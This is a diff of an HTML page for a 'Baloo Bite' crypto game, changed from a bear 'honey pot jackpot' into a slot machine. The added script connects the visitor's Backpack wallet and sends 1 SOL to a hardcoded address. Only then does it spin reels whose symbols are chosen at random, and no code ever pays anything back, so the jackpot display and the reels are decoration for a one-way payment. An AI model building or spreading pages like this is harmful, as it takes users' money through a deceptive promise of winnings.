@@ -3,77 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BALOO BITE - JUNGLE ALPHA</title>
+    <title>BALOO BITE - SLOT MACHINE</title>
     <style>
-        body { background: radial-gradient(circle at center, #1a2f1a 0%, #000 100%); color: #fff; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .game-card { background: rgba(0, 0, 0, 0.85); border: 4px solid #3d2b1f; border-radius: 30px; padding: 40px; text-align: center; width: 360px; box-shadow: 0 0 50px rgba(0,255,0,0.15); position: relative; }
-        .pot-label { color: #8b4513; font-size: 14px; text-transform: uppercase; letter-spacing: 2px; font-weight: bold; }
-        .pot-value { font-size: 56px; color: #ffcc00; font-weight: bold; margin: 10px 0; text-shadow: 0 0 20px rgba(255,204,0,0.4); }
-        .bear-display { font-size: 80px; margin: 30px 0; transition: transform 0.3s; }
-        .status-pill { background: #001a00; color: #00ff00; padding: 8px 15px; border-radius: 20px; font-size: 10px; font-family: monospace; display: inline-block; margin-bottom: 25px; border: 1px solid #00ff00; }
-        .btn-chomp { background: linear-gradient(#ff8c00, #e67e22); color: #fff; border: none; padding: 25px; width: 100%; cursor: pointer; font-weight: bold; font-size: 24px; border-radius: 18px; text-transform: uppercase; box-shadow: 0 8px 0 #b36200; transition: 0.1s; }
-        .btn-chomp:active { transform: translateY(4px); box-shadow: 0 4px 0 #b36200; }
-        .btn-chomp:disabled { background: #333; box-shadow: none; color: #666; cursor: not-allowed; transform: translateY(6px); }
+        body { background: radial-gradient(circle at center, #1a1a1a 0%, #000 100%); color: #fff; font-family: 'Impact', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        
+        .game-card { 
+            background: #0a0a0a; border: 5px solid #c0c0c0; border-radius: 20px; 
+            padding: 40px; text-align: center; width: 380px; box-shadow: 0 0 60px rgba(255,215,0,0.1); 
+        }
+
+        .slot-machine {
+            display: flex; justify-content: center; gap: 10px; margin: 25px 0;
+            background: #111; padding: 15px; border-radius: 10px; border: 2px solid #444;
+        }
+
+        .reel {
+            width: 80px; height: 100px; background: #222; border-radius: 5px;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 40px; border: 2px solid #ffcc00; overflow: hidden; position: relative;
+        }
+
+        /* Animatie voor het spinnen */
+        @keyframes spin {
+            0% { transform: translateY(-200%); }
+            100% { transform: translateY(200%); }
+        }
+        .spinning { animation: spin 0.2s linear infinite; }
+
+        .pot-value { font-size: 50px; color: #ffcc00; text-shadow: 2px 2px #000; margin-bottom: 10px; }
+        
+        .btn-bite { 
+            background: linear-gradient(#444, #111); color: #ffd700; border: 2px solid #ffd700;
+            padding: 20px; width: 100%; cursor: pointer; font-weight: bold; font-size: 24px; 
+            border-radius: 10px; text-transform: uppercase; box-shadow: 0 0 15px rgba(255,215,0,0.2);
+        }
+        .btn-bite:disabled { opacity: 0.3; cursor: not-allowed; }
     </style>
 </head>
 <body>
 
 <div class="game-card">
-    <div class="status-pill" id="status">V16_STABILITY: ACTIVE</div>
-    <div class="pot-label">Honing Pot Jackpot</div>
+    <div style="color: #ffd700; letter-spacing: 2px; font-size: 24px;">BALOO BITE</div>
     <div class="pot-value">1.0 XNT</div>
     
-    <div class="bear-display" id="bear">🐻</div>
+    <div class="slot-machine">
+        <div class="reel"><span id="r1">🦴</span></div>
+        <div class="reel"><span id="r2">🦴</span></div>
+        <div class="reel"><span id="r3">🦴</span></div>
+    </div>
 
-    <button class="btn-chomp" id="mainBtn" onclick="executeBalooBite()">Take a Bite!</button>
+    <button class="btn-bite" id="mainBtn" onclick="executeBalooSpin()">BITE THE BONE</button>
+    <div id="status" style="font-family:monospace; font-size:10px; color:#666; margin-top:20px;">V18_STABILITY: READY</div>
 </div>
 
 <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 <script>
-    async function executeBalooBite() {
-        const log = document.getElementById('status');
+    const bones = ['🦴', '🥈', '🥇']; // Wit, Zilver, Goud
+
+    async function executeBalooSpin() {
         const btn = document.getElementById('mainBtn');
-        const bear = document.getElementById('bear');
+        const status = document.getElementById('status');
+        const reels = [document.getElementById('r1'), document.getElementById('r2'), document.getElementById('r3')];
         const provider = window.backpack;
 
         try {
             btn.disabled = true;
-            log.innerText = "RESETTING SESSION...";
-            bear.style.transform = "scale(1.2)";
+            status.innerText = "BALOO IS SNIFFING...";
             
+            // Start visuele spin
+            reels.forEach(r => r.classList.add('spinning'));
+
+            // De verplichte stabiliteits-pauze
             if (provider.disconnect) await provider.disconnect().catch(() => {});
-            await new Promise(r => setTimeout(r, 4000)); 
-            
-            log.innerText = "OPENING WALLET...";
+            await new Promise(r => setTimeout(r, 3000)); 
             await provider.connect();
 
-            log.innerText = "BITING THE POT...";
             const tx = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: provider.publicKey,
                     toPubkey: new solanaWeb3.PublicKey("BAavP6nxHDkVDowYXoyDaNDbc9CAgncfDPELAyjzoyTq"),
-                    lamports: 1000000000 
+                    lamports: 1e9 
                 })
             );
 
             const result = await provider.signAndSendTransaction(tx);
-            log.innerText = "SUCCESS! SIG: " + result.signature.toString().substring(0, 12);
-            bear.innerText = "😋";
+            
+            // Stop spin en toon resultaat
+            reels.forEach(r => {
+                r.classList.remove('spinning');
+                r.innerText = bones[Math.floor(Math.random() * bones.length)];
+            });
+
+            status.innerText = "SUCCESS! SIG: " + result.signature.toString().substring(0, 10);
 
         } catch (err) {
-            log.innerText = "BEAR IS FULL - WAIT!";
-            bear.innerText = "😴";
+            reels.forEach(r => {
+                r.classList.remove('spinning');
+                r.innerText = '❌';
+            });
+            status.innerText = "BALOO IS RESTING (WAIT)...";
         } finally {
             let countdown = 30;
             const timer = setInterval(() => {
-                btn.innerText = `READY IN ${countdown}S`;
+                btn.innerText = `NEXT BITE IN ${countdown}S`;
                 countdown--;
                 if (countdown < 0) {
                     clearInterval(timer);
                     btn.disabled = false;
-                    btn.innerText = "Take a Bite!";
-                    bear.innerText = "🐻";
-                    bear.style.transform = "scale(1)";
+                    btn.innerText = "BITE THE BONE";
                 }
             }, 1000);
         }
